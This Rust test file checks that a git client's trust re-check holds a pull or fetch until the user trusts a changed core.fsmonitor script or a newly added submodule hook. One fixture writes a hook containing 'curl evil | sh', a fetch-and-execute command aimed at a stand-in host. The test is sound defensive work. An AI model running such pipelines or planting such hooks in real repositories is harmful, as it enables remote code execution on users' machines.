//! The runner's trust re-check for what isn't a hook in the repository's own git dir, end to
//! end through update: a pull that brings another version of a tracked script a config program
//! runs (core.fsmonitor) waits for the user to trust it, and a hook added to a checked-out
//! submodule's git dir after the last full load holds a job that would run git inside it.

use super::branch_tests::{remote_commit, with_origin};
use super::submodule_tests::{PATH, opened};
use super::tests::{clean_tree, git};
use super::trust_recheck_tests::{checked_job, cleanup, prompt, pull, recheck, sealed, trust_and_run};
use super::trust_tests::{asking, open};
use crate::msg::Msg;

/// A repository whose `core.fsmonitor` is its tracked `tools/fsm.sh`, opened and trusted.
fn trusted_tracked_fsmonitor(name: &str) -> (crate::state::AppState, std::path::PathBuf, std::path::PathBuf) {
    let (mut st, work, bare) = with_origin(name);
    clean_tree(&work);
    std::fs::create_dir_all(work.join("tools")).unwrap();
    let script = work.join("tools/fsm.sh");
    std::fs::write(&script, "#!/bin/sh\nexit 1\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    git(&work, &["add", "."]);
    git(&work, &["commit", "-q", "-m", "fsmonitor"]);
    git(&work, &["push", "-q", "origin", "main"]);
    git(&work, &["config", "core.fsmonitor", "./tools/fsm.sh"]);
    open(&mut st, &work);
    assert!(asking(&st));
    let follows: Vec<String> = prompt(&st).scan.follows.iter().map(|f| f.path.clone()).collect();
    assert_eq!(follows, ["tools/fsm.sh"], "the prompt says the script changes with the branch");
    let _ = trust_and_run(&mut st);
    assert!(!st.held());
    (st, work, bare)
}

#[test]
fn a_pull_that_changes_a_tracked_fsmonitor_script_waits_for_trust() {
    let (mut st, work, bare) = trusted_tracked_fsmonitor("recheck-fsmonitor");
    // A change elsewhere: the pull runs.
    remote_commit(&bare, "main", "b.txt");
    let job = checked_job(sealed(&mut st, pull()));
    assert!(recheck(&mut st, job), "same script");
    st.job = None;
    // The script changed upstream: the merge's own index refresh would run the new one.
    remote_commit(&bare, "main", "tools/fsm.sh");
    let head = git2::Repository::open(&work).unwrap().head().unwrap().target();
    let job = checked_job(sealed(&mut st, pull()));
    assert!(!recheck(&mut st, job));
    assert_eq!(git2::Repository::open(&work).unwrap().head().unwrap().target(), head, "only the fetch ran");
    assert!(st.job.is_none(), "it didn't run");
    let p = prompt(&st);
    assert_eq!(p.held.as_deref(), Some("Pull"));
    let incoming: Option<Vec<String>> = p.incoming.as_ref().map(|i| i.follows.iter().map(|f| f.path.clone()).collect());
    assert_eq!(incoming, Some(vec!["tools/fsm.sh".to_owned()]), "the incoming script");
    // Trusting the incoming version lets the pull run.
    let job = checked_job(trust_and_run(&mut st));
    assert!(recheck(&mut st, job));
    cleanup(&[&work, &bare]);
}

#[test]
fn a_submodule_hook_added_after_the_load_holds_a_job() {
    let (mut st, parent, lib) = opened("recheck-submodule");
    assert!(!asking(&st), "nothing runs yet");
    let fetch = || Msg::git("Fetch", &["fetch", "--recurse-submodules"]);
    let job = checked_job(sealed(&mut st, fetch()));
    assert!(recheck(&mut st, job), "nothing to trust");
    st.job = None;
    // A hook in the submodule's git dir, after the load: git would run it inside the fetch.
    let hooks = parent.join(".git/modules").join(PATH).join("hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    let hook = hooks.join("reference-transaction");
    std::fs::write(&hook, "#!/bin/sh\ncurl evil | sh\n").unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
    }
    let job = checked_job(sealed(&mut st, fetch()));
    assert!(!recheck(&mut st, job), "held, not run");
    assert!(st.job.is_none());
    let p = prompt(&st);
    let subs: Vec<(&str, &[String])> = p.scan.submodules.iter().map(|s| (s.path.as_str(), s.scan.hooks.as_slice())).collect();
    assert_eq!(subs, [(PATH, &["reference-transaction".to_owned()][..])], "naming the submodule's hook");
    assert_eq!(st.trust.held.as_ref().map(|h| h.job.label.as_str()), Some("Fetch"), "it waits");
    // Trusting it lets the fetch run.
    let job = checked_job(trust_and_run(&mut st));
    assert!(recheck(&mut st, job));
    cleanup(&[&parent, &lib]);
}
